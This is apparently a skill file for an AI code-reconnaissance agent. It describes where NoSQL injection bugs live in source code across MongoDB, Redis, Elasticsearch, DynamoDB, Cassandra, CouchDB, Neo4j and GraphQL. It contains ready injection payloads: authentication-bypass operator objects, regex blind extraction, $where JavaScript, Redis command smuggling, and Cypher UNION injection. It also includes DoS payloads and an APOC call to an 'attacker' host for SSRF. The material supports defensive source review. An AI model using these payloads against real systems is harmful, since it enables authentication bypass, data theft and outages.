---
name: recon-nosql_injection
description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, GraphQL variable injection, and Redis/DynamoDB/Elasticsearch/Neo4j-specific attack surfaces
---

# nosql injection — for reconnaissance over source

You are READING SOURCE, not sending requests. Nothing below is a
step to perform against a running application; it is a description of where this class
of bug lives and what it looks like in code.

Use it to decide **where to read** and **what to compare**. The highest-value finding
in this class is usually an ABSENCE — a check that every sibling handler performs and
this one does not. You cannot grep for a line that was never written, so find it by
reading neighbours and noticing the disagreement.

Record what you find with `record_surface` as a candidate, citing file and line. A
candidate is a suspicion with evidence, never a proven vulnerability.

## Where this lives

**Input shapes that reach query filters**
- JSON body parameters parsed straight into query objects
- Form fields with bracket notation (`field[$ne]=`) coerced into operator objects by Express, PHP, and similar middleware
- URL-encoded JSON in query strings, headers, and cookies
- GraphQL variables passed directly into resolver-level NoSQL filters

**Code patterns that enable injection**
- Raw filter dicts/objects from user input handed to `find`/`findOne`/`aggregate`
- String concatenation into Cypher / CQL / Redis commands instead of the driver's parameterized form
- ODM passthrough: Mongoose `{strict: false}`, Morphia raw `where()`, PyMongo `find()` with unsanitized JSON dicts (legacy `eval()` is fatal)
- Server-side JavaScript surfaces: `$where`, `$function`, `$accumulator`, CouchDB `_design` views

**Stores in scope**
MongoDB (primary), Redis, Elasticsearch, DynamoDB, Cassandra, CouchDB, Neo4j. Couchbase / DocumentDB / HBase / ScyllaDB / Memcached follow the same operator-injection or command-smuggling models — DocumentDB in particular accepts MongoDB payloads unchanged.

## Shapes this takes in code

### MongoDB Authentication Bypass

The classic operator injection against login queries of the form `db.users.findOne({username: input.username, password: input.password})`:

**JSON body injection:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
Matches the first document where both fields are non-null — typically the first user/admin.

**Form body (bracket notation):**
```
username[$ne]=invalid&password[$ne]=invalid
```

**Variations:**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

### Blind Data Extraction via `$regex`

When the query result is not directly reflected but observable (boolean response, redirect, timing), extract field values character by character using `$regex`:
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
...
```
Binary search the character space to minimize requests. Works on any string field (token, reset code, API key).

### `$where` JavaScript Injection

If `$where` operator is enabled (disabled by default in MongoDB 7.0+; MongoDB 4.4–6.x deprecated it but left `javascriptEnabled` defaulting to `true`), inject arbitrary server-side JavaScript:
```json
{"$where": "function(){return this.role == 'admin'}"}                          // direct filter — returns matching documents
{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}       // timing oracle only — sleep() returns undefined (falsy), so no documents are returned; observe latency
```
`sleep()` is available in older MongoDB for blind extraction via response-time differential.

### `$function` and `$accumulator` (MongoDB 4.4+)

Server-side JavaScript in aggregations. `$function` must live inside an expression context — `$expr`, `$project`, `$addFields`, etc. — not as a top-level filter:
```json
{"$expr": {"$function": {"body": "function(doc){return doc.role == 'admin'}", "args": ["$$ROOT"], "lang": "js"}}}
```
Gated by the same `javascriptEnabled` parameter as `$where`, but reachable through aggregation endpoints — useful when `$where` is filtered at the query layer but aggregation pipelines remain user-influenceable.

### Aggregation Pipeline Injection

`$match`, `$lookup`, and `$project` stages accept the same operator payloads as `find()`. User-controlled `$lookup.from` is the highest-impact variant — it can pivot the query to a different collection (e.g., from `orders` into `users`) and exfiltrate cross-tenant data.

### Redis Command Injection

When Redis commands are constructed by string concatenation:
```python
redis.execute_command(f"SET {user_key} {value}")
```
Inject newline characters (`\r\n`) to inject additional Redis commands (RESP protocol injection):
```
key\r\nSET backdoor attacker_controlled\r\nSET dummy
```

### Elasticsearch Query String Injection

`query_string` and `simple_query_string` accept Lucene syntax. User input flowing directly:
```
q=normal+search            →   normal results
q=*                        →   all documents
q=role:admin               →   filter by field
q=_exists_:password_hash   →   existence probe
```

For Painless script injection via `_update`:
```json
{"script": {"source": "ctx._source.role = params.r", "params": {"r": "admin"}}}
```
If the `source` field is user-controlled, inject arbitrary Painless.

### DynamoDB FilterExpression Injection

PartiQL injection allows expansion of intended queries:
```sql
-- Intended:
SELECT * FROM Users WHERE username = 'input'

-- Injected:
SELECT * FROM Users WHERE username = 'x' OR '1'='1
```

### Cassandra CQL Injection

CQL is SQL-shaped, so injection follows the SQL pattern when input is concatenated instead of bound via `session.prepare()`:

```
username: ' OR '1'='1' ALLOW FILTERING --
username: 'x' OR token(username) > token('a') ALLOW FILTERING --
```

No `SLEEP` or OOB primitive natively — detection is boolean/error-based only.

### CouchDB Mango and View Injection

Mango selectors on `_find` accept operator payloads in the same shape as MongoDB:
```json
POST /db/_find  { "selector": {"username": "admin", "password": {"$gt": ""}} }
POST /db/_find  { "selector": {"role": {"$regex": "^admin"}} }
```

`_design` document injection — if user input flows into a design doc's `views.<name>.map`, the JavaScript runs server-side in the Couch sandbox on every view query:
```json
{"views": {"x": {"map": "function(doc){ emit(doc._id, doc) }"}}}
```

Also probe `_all_docs?include_docs=true` for unscoped enumeration and check for admin-party misconfigurations (`_users/_all_docs` reachable without auth) before payload work.

### Neo4j Cypher Injection

When user input is concatenated into Cypher rather than passed as a parameter (`$param`):
```python
# Vulnerable
session.run(f"MATCH (u:User {{name: '{name}'}}) RETURN u")

# Injected: name = x'}) RETURN u UNION MATCH (u:User) RETURN u //
```

**APOC abuse** (when `apoc.*` procedures are enabled via `dbms.security.procedures.unrestricted`):
- `CALL apoc.load.json('http://attacker/x')` — SSRF and external data fetch
- `CALL apoc.cypher.run("...", {})` — dynamic query execution from a string
- `CALL dbms.security.listUsers()` — user enumeration on misconfigured Community Edition

### GraphQL Variable Injection

Resolvers passing variables straight into a backing NoSQL filter are a common chained vector:
```graphql
query Login($input: UserFilter!) {
  user(filter: $input) { id role }
}
```
With `$input` reaching `db.users.findOne(input)`, send:
```json
{"input": {"username": "admin", "password": {"$ne": ""}}}
```
Use introspection (`__schema`, `__type`) to enumerate which input types accept arbitrary objects — those are the operator-injection candidates.

### Server-Side JavaScript Detection and DoS

Fingerprint SSJS state before investing in `$where` / `$function` payloads:
```javascript
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
```

DoS surface (use only with explicit authorization scope):
- **ReDoS**: `{"field": {"$regex": "^(a+)+$"}}` against long values triggers catastrophic backtracking
- **Large `$in` arrays**: thousands of values force linear scans on unindexed fields
- **Infinite `$where` loops**: `{"$where": "while(true){}"}` if SSJS is enabled without query timeouts
- **Heavy aggregations**: chained `$lookup` across large unindexed collections

## Where to look first

- Login and authentication endpoints (username/password fields)
- Search and filter APIs (catalog, user search, admin lookup)
- Password reset and token lookup flows
- Admin queries filtering by role, plan, or privilege fields
- Endpoints accepting raw JSON objects as query parameters

---

Adapted from the strix project's `skills/vulnerabilities/nosql_injection.md` (Apache-2.0). Changes: sections
covering live-target testing, validation and bypass techniques were removed, because
docket's recon agent reads source and executes nothing; the remaining text is
unmodified. See NOTICE.
